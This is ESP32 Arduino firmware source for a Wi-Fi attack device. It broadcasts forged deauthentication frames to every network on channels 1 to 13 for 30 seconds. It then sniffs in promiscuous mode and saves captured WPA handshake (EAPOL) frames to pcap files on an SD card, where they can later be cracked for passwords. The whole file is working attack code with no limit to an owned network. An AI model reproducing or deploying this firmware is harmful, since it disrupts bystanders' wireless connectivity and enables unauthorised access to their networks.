#include <time.h>
#include <Arduino.h>
#include <WiFi.h>
#include <esp_wifi.h>
#include "FS.h"
#include "SD_MMC.h"
#include "soc/rtc_cntl_reg.h"
#include "soc/soc.h"
#include <set>

#define LED_PIN 33

std::set<String> seenHandshakes;
File pcapFile;
bool pcapInitialized = false;
uint8_t targetBSSID[6];
bool targetSet = false;
uint8_t targetChannel = 1;
bool handshakeComplete = false;
String pcapFilename;
int stage = 1; // 1 = deauth all, 2 = capture handshakes
#define DEAUTH_DURATION 30000  // 30 seconds deauthing all

uint32_t lastDeauthTime = 0;
#define DEAUTH_INTERVAL 5000

#ifdef WEBUI
extern void webui_init();
#endif

void sendDeauth(uint8_t* bssid, uint8_t* client) {
    uint8_t deauthPkt[26] = {
        0xc0, 0x00, 0x3a, 0x01,
        client[0], client[1], client[2], client[3], client[4], client[5],
        bssid[0], bssid[1], bssid[2], bssid[3], bssid[4], bssid[5],
        bssid[0], bssid[1], bssid[2], bssid[3], bssid[4], bssid[5],
        0x00, 0x00, 0x01, 0x00
    };
    Serial.println("TX");
    digitalWrite(LED_PIN, LOW);
    for (int i = 0; i < 10; i++) {
        esp_wifi_80211_tx(WIFI_IF_AP, deauthPkt, sizeof(deauthPkt), false);
        delay(2);
    }
    digitalWrite(LED_PIN, HIGH);
}

bool isEAPOL(uint8_t* payload) {
    if (payload[0] != 0x88 || payload[1] != 0x01) return false;
    return true;
}

void initPcapHeader() {
    pcapFile = SD_MMC.open(pcapFilename.c_str(), FILE_WRITE);
    if (pcapFile) {
        uint32_t magic = 0xa1b2c3d4;
        uint16_t version_major = 2;
        uint16_t version_minor = 4;
        int32_t thiszone = 0;
        uint32_t sigfigs = 0;
        uint32_t snaplen = 65535;
        uint32_t network = 105;

        pcapFile.write((uint8_t*)&magic, 4);
        pcapFile.write((uint8_t*)&version_major, 2);
        pcapFile.write((uint8_t*)&version_minor, 2);
        pcapFile.write((uint8_t*)&thiszone, 4);
        pcapFile.write((uint8_t*)&sigfigs, 4);
        pcapFile.write((uint8_t*)&snaplen, 4);
        pcapFile.write((uint8_t*)&network, 4);
        pcapFile.close();
        pcapInitialized = true;
    }
}

void captureHandshake(uint8_t* payload, uint16_t len, uint8_t msgNum, uint8_t* bssid) {
    char pcapName[32];
    sprintf(pcapName, "/handshake/%02X%02X%02X%02X%02X%02X.pcap",
            bssid[0], bssid[1], bssid[2],
            bssid[3], bssid[4], bssid[5]);

    pcapFile = SD_MMC.open(pcapName, FILE_APPEND);
    if (!pcapFile) return;

    uint32_t ts_sec = micros() / 1000000;
    uint32_t ts_usec = micros() % 1000000;
    uint32_t incl_len = len;
    uint32_t orig_len = len;

    pcapFile.write((uint8_t*)&ts_sec, 4);
    pcapFile.write((uint8_t*)&ts_usec, 4);
    pcapFile.write((uint8_t*)&incl_len, 4);
    pcapFile.write((uint8_t*)&orig_len, 4);
    pcapFile.write(payload, len);
    pcapFile.close();

    Serial.printf("[HANDSHAKE] Msg%d captured\n", msgNum);
}

void sniffer_callback(void* buf, wifi_promiscuous_pkt_type_t type) {
    wifi_promiscuous_pkt_t* pkt = (wifi_promiscuous_pkt_t*)buf;
    uint8_t* payload = pkt->payload;
    uint16_t len = pkt->rx_ctrl.sig_len;

    if (type == WIFI_PKT_MGMT) {
        // Capture any beacon (for logging)
        if (payload[0] == 0x80) {
            memcpy(targetBSSID, &payload[10], 6);
            targetChannel = payload[10 + 6];
            targetSet = true;

            char macStr[18];
            sprintf(macStr, "%02X:%02X:%02X:%02X:%02X:%02X",
                    targetBSSID[0], targetBSSID[1], targetBSSID[2],
                    targetBSSID[3], targetBSSID[4], targetBSSID[5]);
            int ssid_len = payload[37];
            char ssid[33] = {0};
            if (ssid_len > 0 && ssid_len <= 32) memcpy(ssid, &payload[38], ssid_len);
            Serial.printf("[TARGET] %s | %s | CH: %d\n", ssid, macStr, targetChannel);

            char pcapName[32];
            sprintf(pcapName, "/handshake/%02X%02X%02X%02X%02X%02X.pcap",
                    targetBSSID[0], targetBSSID[1], targetBSSID[2],
                    targetBSSID[3], targetBSSID[4], targetBSSID[5]);
            pcapFile = SD_MMC.open(pcapName, FILE_WRITE);
            if (pcapFile) {
                uint32_t magic = 0xa1b2c3d4;
                uint16_t version_major = 2;
                uint16_t version_minor = 4;
                int32_t thiszone = 0;
                uint32_t sigfigs = 0;
                uint32_t snaplen = 65535;
                uint32_t network = 105;
                pcapFile.write((uint8_t*)&magic, 4);
                pcapFile.write((uint8_t*)&version_major, 2);
                pcapFile.write((uint8_t*)&version_minor, 2);
                pcapFile.write((uint8_t*)&thiszone, 4);
                pcapFile.write((uint8_t*)&sigfigs, 4);
                pcapFile.write((uint8_t*)&snaplen, 4);
                pcapFile.write((uint8_t*)&network, 4);
                pcapFile.close();
            }
            Serial.println("[*] Sending deauth to force reconnection...");
        }

        // Capture deauth frames
        if (payload[0] == 0xC0) {
            uint8_t* bssid = &payload[4];
            uint8_t* client = &payload[10];
            if (memcmp(bssid, targetBSSID, 6) == 0 && client[0] != 0xFF) {
                char clientStr[18];
                sprintf(clientStr, "%02X:%02X:%02X:%02X:%02X:%02X",
                        client[0], client[1], client[2], client[3], client[4], client[5]);
                Serial.printf("[CLIENT] %s\n", clientStr);
            }
        }

        // Capture EAPOL (handshake)
        if (isEAPOL(payload)) {
            uint8_t* bssid = &payload[10];  // BSSID is at offset 10 in EAPOL
            uint8_t msgNum = 0;
            uint16_t keyInfo = (payload[25] << 8) | payload[24];
            if (keyInfo & 0x0001) msgNum = 1;
            else if (keyInfo & 0x0002) msgNum = 2;
            else if (keyInfo & 0x0004) msgNum = 3;
            else if (keyInfo & 0x0008) msgNum = 4;

            if (msgNum > 0) {
                char key[18];
                sprintf(key, "%02X%02X%02X%02X%02X%02X-Msg%d",
                        bssid[0], bssid[1], bssid[2],
                        bssid[3], bssid[4], bssid[5], msgNum);

                if (seenHandshakes.find(String(key)) == seenHandshakes.end()) {
                    seenHandshakes.insert(String(key));
                    digitalWrite(LED_PIN, LOW);
                    captureHandshake(payload, len, msgNum, bssid);
                    digitalWrite(LED_PIN, HIGH);

                    Serial.printf("[HANDSHAKE] %s\n", key);
                }
            }
        }
    }

    if (pcapInitialized && len > 0 && len < 2560) {
        pcapFile = SD_MMC.open(pcapFilename.c_str(), FILE_APPEND);
        if (pcapFile) {
            uint32_t ts_sec = micros() / 1000000;
            uint32_t ts_usec = micros() % 1000000;
            uint32_t incl_len = len;
            uint32_t orig_len = len;
            pcapFile.write((uint8_t*)&ts_sec, 4);
            pcapFile.write((uint8_t*)&ts_usec, 4);
            pcapFile.write((uint8_t*)&incl_len, 4);
            pcapFile.write((uint8_t*)&orig_len, 4);
            pcapFile.write(payload, len);
            pcapFile.close();
        }
    }
}

void setup() {
    WRITE_PERI_REG(RTC_CNTL_BROWN_OUT_REG, 0);
    pinMode(LED_PIN, OUTPUT);
    // Blink LED to show code is running
    for(int i=0; i<5; i++) {
        digitalWrite(LED_PIN, LOW);
        delay(100);
        digitalWrite(LED_PIN, HIGH);
        delay(100);
    }
    digitalWrite(LED_PIN, HIGH);
    Serial.begin(115200);
    delay(100);
    Serial.println("Starting...");
    Serial.flush();

    Serial.println("Init SD...");
    Serial.flush();
    
    // Don't block on SD - just continue without it
    if (!SD_MMC.begin("/sdcard", true)) {
        Serial.println("SD: FAILED (continuing without)");
    } else {
        Serial.println("SD: OK");
        time_t now = time(nullptr);
        struct tm* ti = localtime(&now);
        char fname[64];
        snprintf(fname, sizeof(fname), "/handshake/%04d%02d%02d-%02d%02d%02d.pcap",
                 ti->tm_year + 1900, ti->tm_mon + 1, ti->tm_mday,
                 ti->tm_hour, ti->tm_min, ti->tm_sec);
        pcapFilename = String(fname);
        SD_MMC.mkdir("/handshake");
        initPcapHeader();
    }
    Serial.flush();

#ifdef WEBUI
    webui_init();
#endif

    WiFi.mode(WIFI_STA);
    Serial.println("WiFi mode set to STA");
    Serial.flush();
    
    esp_wifi_set_promiscuous(true);
    Serial.println("Promiscuous mode on");
    Serial.flush();
    
    esp_wifi_set_promiscuous_rx_cb(&sniffer_callback);
    Serial.println("Callback set");
    Serial.flush();
    
    Serial.println("HANDSHAKE AUTO RUNNING");
    Serial.flush();
    Serial.println("Waiting for target network...");
    Serial.flush();
}

void loop() {
    uint32_t now = millis();
    static uint32_t stageStartTime = 0;
    static uint8_t ch = 1;
    static uint32_t debugTime = 0;
    
    // Debug: print every 10 seconds
    if (now - debugTime > 10000) {
        Serial.printf("Running: stage=%d, ch=%d\n", stage, ch);
        Serial.flush();
        debugTime = now;
    }
    
    if (stage == 1) {
        // Stage 1: Deauth all networks
        if (stageStartTime == 0) {
            stageStartTime = now;
            Serial.println("[STAGE 1] Deauthing all networks...");
        Serial.flush();
        }
        
        esp_wifi_set_channel(ch, WIFI_SECOND_CHAN_NONE);
        
        if (now - lastDeauthTime > 100) {
            Serial.println("[DEAUTH] Sending...");
            uint8_t broadcast[6] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};
            sendDeauth(broadcast, broadcast);
            lastDeauthTime = now;
        }
        
        // Switch channel every 5 seconds
        static uint32_t lastChannelChange = 0;
        if (now - lastChannelChange > 5000) {
            ch = (ch % 13) + 1;
            lastChannelChange = now;
            Serial.printf("[STAGE 1] Channel %d\n", ch);
        }
        
        // After DEAUTH_DURATION, move to stage 2
        if (now - stageStartTime > DEAUTH_DURATION) {
            stage = 2;
            stageStartTime = 0;
            ch = 1;
            Serial.println("[STAGE 2] Capturing handshakes...");
        }
        
    } else if (stage == 2) {
        // Stage 2: Capture handshakes on each channel
        if (stageStartTime == 0) {
            stageStartTime = now;
        }
        
        esp_wifi_set_channel(ch, WIFI_SECOND_CHAN_NONE);
        
        // Switch channel every 3 seconds
        static uint32_t lastChannelChange = 0;
        if (now - lastChannelChange > 3000) {
            ch = (ch % 13) + 1;
            lastChannelChange = now;
        }
        
        // Stop after 60 seconds of capture
        if (now - stageStartTime > 60000) {
            Serial.println("[DONE] Capture complete");
            while(1) delay(1000);
        }
    }
    
    delay(100); 
}
